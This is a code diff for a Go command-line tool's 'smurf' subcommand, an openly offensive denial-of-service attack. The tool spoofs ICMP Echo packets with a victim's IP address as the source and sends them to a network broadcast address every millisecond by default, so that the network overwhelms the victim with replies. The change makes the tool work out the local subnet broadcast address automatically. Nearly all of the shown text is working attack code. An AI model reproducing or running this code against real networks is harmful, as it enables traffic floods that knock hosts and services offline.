@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/binary"
 	"encoding/hex"
 	"fmt"
 	"log"
@@ -37,16 +38,9 @@ func smurfValidator(ctx *cli.Context) error {
 }
 
 func smurfHandler(ctx *cli.Context) error {
-	banner := "Victim: %s\nBroadcasting ICMP to: %s\nEvery: %s\nPayload:\n---\n%v---\n"
-
 	target := net.ParseIP(ctx.String(name(targetFlag)))
 	if target == nil {
 		return errors.New("invalid target IP address")
-	}
-
-	broadcast := net.ParseIP(ctx.String(name(broadcastFlag)))
-	if broadcast == nil {
-		return errors.New("invalid broadcast IP address")
 	}
 
 	every, err := time.ParseDuration(ctx.String(name(everyFlag)))
@@ -60,16 +54,23 @@ func smurfHandler(ctx *cli.Context) error {
 	}
 	defer w.Close()
 
+	ip, mask, err := w.IP()
+	if err != nil {
+		return err
+	}
+	broadcast := broadcastIP(ip, mask)
+
 	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
 		SrcIP:  target,
 		DstIP:  broadcast,
 		SrcMAC: w.MAC(),
-		DstMAC: net.HardwareAddr{255, 255, 255, 255, 255, 255}, // broadcast MAC
+		DstMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
 	})
 	if err != nil {
 		return errors.Wrap(err, "could not build payload")
 	}
 
+	banner := "Victim: %s\nBroadcasting ICMP to: %s\nEvery: %s\nPayload:\n---\n%v---\n"
 	fmt.Printf(banner, target, broadcast, every.String(), hex.Dump(payload))
 
 	exec.Loop(every, func() {
@@ -79,6 +80,16 @@ func smurfHandler(ctx *cli.Context) error {
 	})
 
 	return nil
+}
+
+func broadcastIP(ip net.IP, mask net.IPMask) net.IP {
+	i := binary.BigEndian.Uint32(ip.To4())
+	m := binary.BigEndian.Uint32(net.IP(mask).To4())
+
+	bc := make(net.IP, 4)
+	binary.BigEndian.PutUint32(bc, i|^m)
+
+	return bc
 }
 
 func main() {
@@ -98,7 +109,6 @@ func main() {
 					Usage:   "make a network overwhelm a host with ICMP Echo replies",
 					Flags: []cli.Flag{
 						asMandatory(targetFlag),
-						withDefault(broadcastFlag, "255.255.255.255"),
 						withDefault(ifaceFlag, "en0"),
 						withDefault(everyFlag, "1ms"),
 					},
